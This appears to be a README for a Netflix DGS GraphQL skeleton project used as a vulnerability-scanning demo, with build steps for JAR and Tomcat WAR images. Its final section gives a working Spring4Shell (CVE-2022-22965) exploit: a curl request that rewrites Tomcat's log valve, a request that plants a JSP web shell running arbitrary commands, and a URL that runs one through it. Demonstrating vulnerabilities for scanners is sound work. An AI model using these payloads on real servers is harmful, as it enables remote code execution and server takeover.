# DGS (from Netflix) skeleton project

[![github-dgs-build](https://github.com/muldos/dgs-skeleton/actions/workflows/workflow.yml/badge.svg)](https://github.com/muldos/dgs-skeleton/actions/workflows/workflow.yml)


[![Scanned by Frogbot](https://raw.github.com/jfrog/frogbot/master/images/frogbot-badge.svg)](https://docs.jfrog-applications.jfrog.io/jfrog-applications/frogbot)
## Introduction

Run the project locally (outside docker): 
Set SHOWS_JSONDB_FOLDER env var (example : /Path/to/dgs-skeleton/src/main/resources/data)
then run

```
mvn spring-boot:run
```

## Build & run
Be sure that docker daemon is running.

Build as self executable JAR

```
export PKG_VERSION=1.2.3
export PKG_TYPE=jar
jf mvn -Drevision=$PKG_VERSION -Dmaven.test.skip=true clean package
docker build --build-arg JAR_FILE_NAME=dgs-skeleton-$PKG_VERSION.$PKG_TYPE -t dgs-graphql:latest .
docker run -p 8080:8080 -v ./src/main/resources/data:/var/db_data -d --name graphql-demo dgs-graphql:latest
```

Then browse to http://localhost:8080/graphiql

Build WAR for Tomcat
```
export PKG_VERSION=1.2.3
export PKG_TYPE=jar
export MVN_VIRTUAL_REPO=dro-backend-maven-virtual
jf mvnc --repo-resolve-releases=$MVN_VIRTUAL_REPO --repo-deploy-releases=$MVN_VIRTUAL_REPO --repo-resolve-snapshots=$MVN_VIRTUAL_REPO  --repo-deploy-snapshots=$MVN_VIRTUAL_REPO
jf mvn -Drevision=$PKG_VERSION -Dmaven.test.skip=true -f pom-war.xml clean package deploy
cp ./target/dgs-skeleton-webapp-$PKG_VERSION.$PKG_TYPE ./target/jfrog-demo.war
docker build --build-arg WAR_FILE_NAME=jfrog-demo.war -f DockerfileTomcat -t dgs-graphql-tomcat:latest .
docker run -p 8080:8080 -v $PWD/src/main/resources/data:/var/db_data -d --name graphql-demo dgs-graphql-tomcat:latest
```

Then browse to http://localhost:8080/jfrog-demo/graphiql

If this version is containing the vulnerabilty CVE-2022-22965, you can then exploit it as follow : 

First run
```
curl -H "Accept: text/html;" "http://localhost:8080/jfrog-demo/vulnerable-path?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%63%6f%64%65%7d%69&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
```
To changes Tomcat config valve.

Then create the web shell 
```
curl -H "Accept: text/html;" -H "code: <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(String.valueOf(1337))).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1) { out.println(new String(b)); } %>" "http://localhost:8080/jfrog-demo/vulnerable-path"
```
And run commands using
```
http://localhost:8080/shell.jsp?1337=ls%20-al
```

### References
- https://github.com/itsecurityco/CVE-2022-22965
- https://netflix.github.io/dgs/

